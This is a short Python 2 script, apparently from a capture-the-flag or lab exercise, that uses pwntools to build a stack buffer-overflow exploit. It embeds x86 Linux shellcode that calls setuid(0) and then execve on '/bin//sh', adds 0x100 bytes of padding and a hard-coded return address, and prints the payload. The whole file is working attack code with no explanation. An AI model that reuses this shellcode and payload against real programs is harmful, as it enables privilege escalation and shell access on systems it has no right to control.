shellcode="\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
from pwn import *
shell_add=p64(0xffffcea4)

exploit = shellcode+"a"*0x100 + shell_add

#exploit = "a"*104+"BBBB"

print exploit

#\x24\xcd\xff\xff
